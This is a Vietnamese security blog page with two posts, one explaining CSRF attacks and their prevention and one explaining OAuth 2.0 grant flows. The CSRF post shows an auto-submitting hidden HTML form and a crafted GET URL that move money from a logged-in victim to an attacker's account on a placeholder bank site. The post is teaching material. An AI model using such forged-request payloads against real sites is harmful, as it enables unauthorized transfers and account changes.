<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-CROSS SIDE REQUEST FORGERY" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/" class="article-date">
  <time datetime="2020-06-15T07:00:00.000Z" itemprop="datePublished">2020-06-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/">Cross Side Request Forgery</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:heading {"level":4} -->
<h4>CSRF là gì ?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Cross site request forgery viết tắt là CSRF là một trong những lỗ hổng khá phổ biến của web application, lọt vào top 10 lỗ hổng của OWASP. Cũng được biết đến với các tên gọi&nbsp;<em>one-click attack, session riding, XSRF</em>,(còn mk thích gọi là client site request forgery :) ) , là một phương thức tấn công lừa trình duyệt người dùng thực hiện những request không mong muốn đến server trong khi họ vẫn trong phiên đăng nhập để attacker bypass xác thực.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":591,"height":444} -->
<figure class="wp-block-image is-resized"><img src="https://manhnv.com/images/posts/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/Cross-Site-Request-Forgery.jpg?raw=true" alt="" width="591" height="444"/><figcaption>Cách tấn công CSRF</figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Yếu tố dẫn đến lỗ hổng</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Chúng ta đều biết server sẽ lưu trữ cookie ở phía người dùng để phân biệt người dùng. Mỗi khi người dùng gửi một request tới một domain nào đó, cookie sẽ được tự động gửi kèm theo. Những web app chỉ sử dụng xác thực thông qua cookie , session cookie sẽ có nguy cơ bị tấn công CSRF. Tác động của nó đến người dùng có thể như thay đổi thông tin như usame, mail, password ... hay các hoạt động như là chuyển tiền , xóa tài khoản ... . Cùng xem ví dụ dưới đây :</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://manhnv.com/images/posts/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/CSRF-copy.jpg?raw=true" alt="CSRF"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> Một website có chức năng tiền và xác thực thông qua "Auth Cookie " của người dùng và tất nhiên giá trị attacker sẽ không thể biết hay đoán được này. Attacker sẽ tạo ra một GET request đến website vs URL có nội dung là chuyển tiền đến 1 tài khoản của hacker như sau :</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p><a rel="noreferrer noopener" href="http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243" target="_blank">http://bank.com/app/transfer?amount=100000&amp;destinationAccount=7895457898054</a></p><cite>GET Request</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Hoặc nếu server chỉ nhận POST request thì attacker sẽ tạo ra một form trong file html như sau:</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>&lt;html&gt;<br>&nbsp; &lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form action="<a rel="noreferrer noopener" href="http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243" target="_blank">http://bank.com/app/transfer</a>" method="POST"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="destinationAcount" value="<a rel="noreferrer noopener" href="http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243" target="_blank">7895457898054</a>" /&gt;                                                                      &lt;input type="hidedn" name="amount" value="<a rel="noreferrer noopener" href="http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243" target="_blank">100000</a>" /&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&nbsp;&nbsp;&nbsp; &lt;script&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.forms[0].submit();<br>&nbsp;&nbsp;&nbsp; &lt;/script&gt;<br>&nbsp; &lt;/body&gt;<br>&lt;/html&gt;</p><cite>POST request</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Khi trình duyệt của người dùng thực thi link hay file này sẽ đính kèm giá trị "Auth cookie" của website cấp cho người dùng đã được lưu để duy trì đăng nhập vào request lên server . Hiển nhiên phía server sẽ xác định đây là request do người dùng thực hiện và chuyển tiền tới tài khoản của attacker.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Cách thức tấn công </h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Đối với các request mà server chỉ nhận phương thức POST ,attacker sẽ tạo form trong file html và gửi cho nạn nhân . Request sẽ được thực thi khi nạn nhân mở file bằng trình duyệt như trong ví dụ trên.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Còn đối với request mà server dùng phương thức GET , attacker cũng có thể dùng form như phương thức POST nhưng thường cách dễ dàng hơn là gửi 1 URL có chứa các tham sỗ đã set sẵn. Hacker sẽ bỏ URL này vào 1 thẻ img, hoặc sử dụng các trang web phising để lừa người dùng thực thi.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p><a rel="noreferrer noopener" href="http://jav.bank/?from=Person1&amp;to=Person2&amp;amount=1000" target="_blank">http://jav.bank?from=Person1&amp;to=Person2&amp;amount=1000</a></p><cite>Vid dụ URL </cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Ngoài ra còn một số cách khai thác đặc biệt đối với các kiểu dữ liệu được gửi đi ví dụ với JSON data. Các bạn có thể tham khảo ở đây :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><a href="https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b" target="_blank" rel="noopener">https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b</a></li><li><a href="https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2" target="_blank" rel="noopener">https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2</a></li><li><a href="https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0" target="_blank" rel="noopener">https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Một số trường hợp có thể đoán được giá trị xác thực như việc sử dụng referer-header để xác thực hoặc server cùng tồn tại lỗ hổng CRLF cũng có thể dẫn đến tấn công cookie injection và chuyển sang tấn công CSRF. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Cuối cùng là việc sử dụng xác thực lỏng lẻo như csrf_token không liên kết với users session hoặc bỏ qua xác thực nếu không nhận được csrf_token đều có thể dẫn đến bypass.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Tất cả các trường hợp đều được giải thích rõ  và thực hành trong các lab của PortSwigger, các bạn có thể tham khảo link cuối bài.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Làm thế nào để ngăn chặn tấn công CSRF?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Người dùng không nên click vào các đường dẫn mà bạn nhận được qua email, qua facebook … Khi bạn đưa chuột qua 1 đường dẫn, phía dưới bên trái của trình duyệt thường có địa chỉ website đích, bạn nên lưu ý để đến đúng trang mình muốn. Không truy cập vào các trang web độc hại dễ bị lừa. Không thực thi các file không rõ nguồn gốc và chức năng. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Còn về phía server sử dụng captcha, các thông báo xác nhận. Captcha được sử dụng để nhận biết đối tượng đang thao tác với hệ thống là con người hay không? Các thao tác quan trọng như "đăng nhập" hay là "chuyển khoản" ,"thanh toán" thường là hay sử dụng captcha. Tuy nhiên, việc sử dụng captcha có thể gây khó khăn cho một vài đối tượng người dùng và làm họ khó chịu. Các thông báo xác nhận cũng thường được sử dụng, ví dụ như việc hiển thị một thông báo xác nhận "bạn có muốn xóa hay k" cũng làm hạn chế các kĩ thuật Cả hai cách trên vẫn có thể bị vượt qua nếu kẻ tấn công có một kịch bản hoàn hảo và kết hợp với lỗi XSS.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Và thứ 2 là sử dụng token (csrf_token,jwt ...): Tạo ra một token tương ứng với mỗi form, token này sẽ là duy nhất đối với mỗi form và thường thì hàm tạo ra token này sẽ nhận đối số là"SESSION". Khi request đến, hệ thống sẽ thực hiên so khớp giá trị token này để quyết định có thực hiện hay không.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Link tham khảo :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><a href="https://gbhackers.com/a8-cross-site-request-forgery-csrf/" target="_blank" rel="noopener">https://gbhackers.com/a8-cross-site-request-forgery-csrf/</a></li><li><a href="https://portswigger.net/web-security/csrf" target="_blank" rel="noopener">https://portswigger.net/web-security/csrf</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/" data-id="ckbgpmbcg0006qxjmgc4k8pi9" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-App/" rel="tag">Web App</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-oath" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/oath/" class="article-date">
  <time datetime="2020-06-15T01:20:34.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/oath/">Oauth</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.codehub.vn/post/1577243102_c5b006c20d8069e8e61f3291be2f43b8.jpeg" alt="OpenID và OAuth Khác Nhau Như Thế Nào"/><figcaption>Ảnh từ codehub.vn</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Xin chào các bạn mình đã quay trở lại với ... bài viết dài , thôi vào nội dung luôn .</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Khái&nbsp;niệm&nbsp;&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>OAuth</strong> (Open Authorization) là một phương thức ủy quyền để cung cấp khả năng truy cập các tài nguyên qua giao thức HTTP . OAuth cho phép các trang web hoặc ứng dụng (Customer) truy cập tài nguyên được bảo vệ từ dịch vụ web (Service Provider) thông qua API mà không yêu cầu người dùng tiết lộ thông tin đăng nhập được cấp bởi nhà cung cấp dịch vụ cho bên thứ ba. Nó hoạt động như một trung gian thay mặt cho người dùng cuối, cấp quyền sử dụng thông tin của tài khoản được chia sẻ cho dịch vụ của bên thứ ba với access token.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Lịch&nbsp;sử&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>OAuth được phát hành lần đầu tiên vào năm 2007 là phương thức ủy quyền sử dụng cho Twitter application program interface (API) với tên gọi là OpenID . Năm 2010, OAuth 1.0 Revision được xuất bản đê giải quyết về vấn đề session fixation tồn tại. Năm 2012, Nhóm làm việc OAuth của IETF đã xuất bản bản thảo đầu tiên của giao thức OAuth 2.0. Giống như OAuth ban đầu, OAuth 2.0 cung cấp cho người dùng khả năng cấp quyền truy cập ứng dụng của bên thứ ba vào tài nguyên web mà không cần chia sẻ mật khẩu. Tuy nhiên, đây là một giao thức hoàn toàn mới và không tương thích ngược với OAuth 1.0. Các tính năng được cập nhật bao gồm uồng cấp mã ủy quyền mới để áp dụng cho các ứng dụng di động, chữ ký được đơn giản hóa và token tồn tại trong thời gian ngắn với các ủy quyền tồn tại lâu dài. Và hiện tại OAuth đãng triển khai , phát triển phiên bản OAuth 2.1.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Trong bài viết này mình sẽ chỉ trình bày các thứ liên quan đến phiên bản OAuth2 bởi một phần OAuth 2 đã được sử dụng phổ biến hơn và  nếu mk trình bày cả OAuth1 nữa rất là dài. cực kì nhiều thứ nên các bạn có thể tham khảo bên ngoài hoặc đợi một ngày nào đó mình sẽ viết về nó.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Các&nbsp;thuật&nbsp;ngữ&nbsp;sử&nbsp;dụng&nbsp;&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Resource owner</strong> (User) Một thực thể có khả năng cấp quyền truy cập vào một tài nguyên được bảo vệ. Khi chủ sở hữu tài nguyên là một người , nó được gọi là một người dùng cuối.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Client</strong> (Application) Một ứng dụng thực hiện các yêu cầu đến tài nguyên được bảo vệ thay mặt cho chủ sở hữu tài nguyên và với sự ủy quyền của nó . Hiểu một cách đơn giản hơn là những ứng dụng mong muốn truy cập vào dữ liệu người dùng.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Authorization server</strong> (API) Máy chủ cấp phát access token cho client sau khi xác thực thành công với chủ sở hữu tài nguyên và có được ủy quyền.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Resource Server</strong> (API) Máy chủ lưu trữ các tài nguyên được bảo vệ, có quyền chấp nhận và phản hồi các requests có chứa access token đến tài nguyên được bảo vệ, hay chính là xác thực ủy quyền</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Resource Server và Authorization Server là một điểm khác biệt giữa OAuth2 và OAuth1 khi tách biệt hai thao tác: cấp mã ủy quyền (access token) và xác thực ủy quyền (Authentication) thành 2 Server còn OAuth1 thực hiện trên cùng một server gọi là <strong>Sevice Provider</strong>.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>OAuth&nbsp;hoạt&nbsp;động&nbsp;như&nbsp;thế&nbsp;nào&nbsp;?&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":345,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="https://hydrasky.ml/wp-content/uploads/2020/06/image.png" alt="" class="wp-image-345"/><figcaption>Ảnh từ Viblo.asia</figcaption></figure>
<!-- /wp:image -->

<!-- wp:list {"ordered":true} -->
<ol><li>Client sẽ yêu cầu ủy quyền truy cập các Protected Resource từ Resource owner (User). Cient có thể trực tiếp thực hiện yêu cầu ủy quyền tới Resource owner hoặc thông qua Authorization server enpoint để User cho phép truy cập.</li><li>User sẽ xác thực và ủy quyền truy cập tới Resource cho client , lúc này Ứng dụng sẽ nhận được Cấp phép (Authorization Grant) . Sẽ có 4 kiểu cấp quyền nên việc cấp như thế nào client sẽ phụ thuộc vào loại ứng dụng dùng để truy cập vào tài nguyên. Đây được coi như là chứng chỉ đại diện cho sự ủy quyền của Resource Owner.</li><li>Ứng dụng client yêu cầu access token từ Authorization Server bằng cách chuyển Authorization Grant cùng với các thông tin khác để xác thực, chẳng hạn như <strong>client ID</strong>, <strong>client secret</strong>, and <strong>grant_type</strong>.</li><li>Khi xác thực thành công, Authorization Server sẽ phát hành <strong>Access Token</strong> và <strong>Refresh Token</strong> cho ứng dụng client.</li><li>Ứng dụng yêu cầu quyền truy cập vào Protected Resource từ Resource Server và xác thực bằng cách đưa ra Access Token .</li><li>Khi xác thực thành công yêu cầu của máy khách, Resource Server sẽ trả về tài nguyên được yêu cầu.</li></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Mục đích <strong>Refresh token</strong> ở đây là dùng để xác thực với Authorization Server thay vì nhờ User như trên để lấy Access token mới khi Access token cũ đã bị hết hạn. Lưu ý là không phải  <strong>Grant Types</strong> nào cũng hỗ trợ refresh_token và việc có nhận, sử dụng nó là không bắt buộc, là tùy chọn của bạn.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>grant_type=refresh_token&amp;refresh_token=tGzv3JOkF0XG5Qx2TlKWIA</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2><strong>Authorization&nbsp;grant&nbsp;types</strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>OAuth 2.0 Authorization Framework đã đưa ra 4 luồng để lấy Access Token, các luồng này được gọi là "<strong>Grant types</strong>" .</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Authorization&nbsp;Code&nbsp;Flow</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Đây là một hình thức ủy quyền được dùng phổ biến nhất hiện nay, thường được sử dụng bởi các ứng dụng web triển khai trên máy chủ và nó có thể cung cấp cả Access Token và Refresh Token. Authentization Code thuộc kiểu <strong>redirection-based flow</strong> nên Client có thể tương tác với resource owner và có khả năng nhận các yêu cầu đến từ Authorization Server .</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Flow</h4>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i2.wp.com/blogs.innovationm.com/wp-content/uploads/2019/07/blog-open1.png?resize=625%2C348" alt="Oauth2 authorization code flow "/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Đầu tiên, chọn đăng nhập thông qua một bên thứ 3 nào đấy , ví dụ trong hình "Login in with Google"</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ứng dụng (Client)  sẽ chuyển hướng người dùng đến Authorization Server (/authorize endpoint) .</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>https:&#47;&#47;accounts.google.com/oauth/authorize?response_type=code&amp;client_id=CLIENT_ID&amp;redirect_uri=yelp.com/callback&amp;scope=profile_contact 
Trong đó : 
- response_type là tham số  chỉ định ứng dụng đang yêu cầu nhận authorization_code 
- client_id là ID của ứng dụng đăng kí với service bên thứ 3 đó, Authorization Server sẽ biết khách hàng của ứng dụng nào đang yêu cầu xin ủy quyền.
- redirect_uri là nơi sẽ truyển hướng về khi nhận code
- scope : là phạm vi quyền truy cập</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Authorization Server sẽ chuyến hướng User đến mục đăng nhập nếu như bạn chưa đăng nhập và lời nhắc có cho chép ủy quyền hay không? </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Sau khi User cho phép , Authorization Server sẽ tiếp tục chuyến hướng người dùng quay trở lại ứng dụng  (Client) với Authorization <strong>CODE</strong> .( Các bước sau không còn cần tác nhân User)</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>https:&#47;&#47;yelp.com/callback?code=AUTHORIZATION_CODE</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Sau khi nhận được, Client sẽ thực hiện một request POST gửi Authorization <strong>CODE</strong> đó đến Authorization Server (/oauth/token endpoint) cùng với lại các tham số CLIENT ID và CLIENT SECRET của ứng dụng để Server xác thực . </p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>https:&#47;&#47;accounts.goole.com/oauth/token?client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;grant_type=authorization_code&amp;code=AUTHORIZATION_CODE&amp;redirect_uri=CALLBACK_URL
Trong đó : 
CLIENT SECRET ở đây là một giá trị bí mật chỉ cho phép APP và Authorization Server biết.</code></pre>
<!-- /wp:code -->

<!-- wp:group -->
<div class="wp-block-group"><div class="wp-block-group__inner-container"><!-- wp:paragraph -->
<p>Phía Authorization Server sẽ thực hiện xác thức các giá trị được gửi.</p>
<!-- /wp:paragraph --></div></div>
<!-- /wp:group -->

<!-- wp:group -->
<div class="wp-block-group"><div class="wp-block-group__inner-container"><!-- wp:group -->
<div class="wp-block-group"><div class="wp-block-group__inner-container"><!-- wp:paragraph -->
<p>Nếu như thành công , Authorization Server trả về &nbsp;ID Token và Access Token ( Refresh Token).</p>
<!-- /wp:paragraph --></div></div>
<!-- /wp:group --></div></div>
<!-- /wp:group -->

<!-- wp:group -->
<div class="wp-block-group"><div class="wp-block-group__inner-container"><!-- wp:paragraph -->
<p>Bây giờ ứng dụng  có thể sử dụng Access Token để truy cập thông tin  của người dùng User thông qua API.</p>
<!-- /wp:paragraph --></div></div>
<!-- /wp:group -->

<!-- wp:paragraph -->
<p>Grant Type này còn thường được dùng cho mobile apps nhưng có đôi chút khác biệt trong quá trình xin ủy quyền. Nguyên nhân là do native apps hay Single-page apps  không thể lưu trữ hay đảm bảo được tính bí mật cho <strong>CLIENT SECRET</strong>  nên không thể sử dụng cái giá trị này để Authorization Server xác thực định danh ứng dụng. Và đó là lí do Flow sẽ bị thay đổi với cái tên là Authorization Code Flow với <strong>Proof Key for Code Exchange (PKCE)</strong>. Lúc này thay vì sử dụng CLIENT SECRET  nó sẽ sử dụng <strong>CODE VERIF</strong>IER và <strong>Challenge</strong>. Chi tiết hơn bạn có thể tham khảo <a href="https://auth0.com/docs/flows/concepts/auth-code-pkce" target="_blank" rel="noreferrer noopener">tại đây</a> .</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Implicit Flow</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Loại ủy quyền này thường được sử dụng cho các ứng dụng chạy trên trình duyệt (VD: Chrome Extension) và có thể ấp dụng cho các ứng dụng mà không sử dụng Client Secret nhưng người ta vẫn khuyến cáo bạn nên dùng <strong><strong>PKCE</strong></strong> hơn bởi Implicit không quá bảo mật .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Khác với lại Authorization code , Authorization Server sẽ trả về Access Token luôn thay vì tiến hành trao đổi như Authorization code ,thứ 2 Implicit là  chỉ dùng để lấy access token và không hỗ trợ  Refresh Token.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>FLow</h4>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://curity.io/assets/images/resources/standards/oauth/flows/implicit-flow-01.svg" alt="Implicit Flow"/><figcaption><img src="https://curity.io/assets/images/resources/standards/oauth/flows/implicit-flow-01.svg" alt="Implicit Flow"></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Đầu tiên  User sẽ chọn login</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Browser lúc này sẽ chuyển hướng người dùng đến Authorizarion Server (<strong>/authorize</strong>&nbsp;endpoint) </p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>/authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=https://client.example.com/callback </code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>User tiến hành xác thực nếu chưa login và ủy quyền cho ứng dụng .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Authorization Server chuyển hướng người dùng quay trở lại Browser cùng với Access Token.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>http:&#47;&#47;example.com/callback#access_token=2YotnFZFEjr1zCsicMWpAA&amp;state=xyz&amp;token_type=example&amp;expires_in=3600</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Ok như vậy nếu như ứng dụng là 1 web-based app thì đến đây là có thể call API với Access Token để lấy dữ liệu từ Resource Owner. Còn đối với Mobile Application sẽ cần phải có các bước khác để trích xuất Access Token trong URI bằng script và gửi về cho nó. Nhưng một phần vì mình chưa có cơ hội được thực nghiệm nên mình sẽ không trình bày về nó , và dù tài liệu có nói nhưng rất khó mường tượng ra. Bạn có thể tham khảo ở <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc6749#section-4.2" target="_blank">đây</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Resource owner credentials grant</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Grant type này chỉ áp dụng cho  cho những ứng dụng có mức độ tin tưởng cao ( ví dụ như các ứng dụng của các dịch vụ đó phát hành hoặc các ứng dụng mặc định trên hệ thống )  . Bởi vì User sẽ phải cung cấp thông tin username và password trực tiếp cho Application sử dụng để lấy access_token.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Flow</h4>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cdn2.auth0.com/docs/media/articles/api-auth/password-grant.png" alt="Tài nguyên mật khẩu của chủ sở hữu"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Đầu tiên User nhập thông tin đăng nhập (Username/Password) vào ứng dụng.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>grant_type=password&amp;username=johndoe&amp;password=A3ddj3w</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Ứng dụng chuyển tiếp thông tin đăng nhập đến Authorization Server.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Authorization Server xác thực thông tin và trả về Access Token và Refresh Token.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ứng dụng có thể sử dụng Access Token để gọi API .</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Client Credentials Flow</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Với các ứng dụng machine-to-machine (M2M), chẳng hạn như CLI, daemon hoặc dịch vụ chạy trên back-end của bạn, hệ thống sẽ xác thực và ủy quyền cho ứng dụng thay vì người dùng. Ứng dụng có thể yêu cầu lấy Access Token bằng bằng các thông tin của ứng dụng như CLIENT ID , CLIENT SECRET.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Flow</h4>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cdn2.auth0.com/docs/media/articles/flows/concepts/auth-sequence-client-credentials.png" alt="Trình tự xác thực luồng thông tin khách hàng"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Client  xác thực với Authorization Server bằng CLIENT ID và CLIENT SECRET .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Authorization Server  xác thực và  phản hồi với Access Token.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ứng dụng của bạn có thể sử dụng Access Token để gọi API cho chính nó.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ok như vậy là mình trình bày khá tổng quát về các thứ của OAuth2, mình khuyến khích các bạn đọc thêm về nó chứ mình không thể nào viết chi tiết hơn được nữa mặc dù không khó hiểu nhưng nó quá dài. Mình sẽ để link bài viết ở cuối để các bạn tham khảo.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Qua bài viết này tôi đã giới thiệu với các bạn về OAuth2: khái niệm, các đối tượng tham gia, các luồng hoạt động , còn việc triển khai thì mình sẽ không trình bày các bạn nên tự tìm hiểu. Còn vấn đề về bảo mật và cách cách bypass thì mình sẽ trình bày vào bài viết sau. Cái gì cũng cần phải lắm chắc lý thuyết trước đã nhé.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>THAM KHẢO</h2>
<!-- /wp:heading -->

<!-- wp:list -->
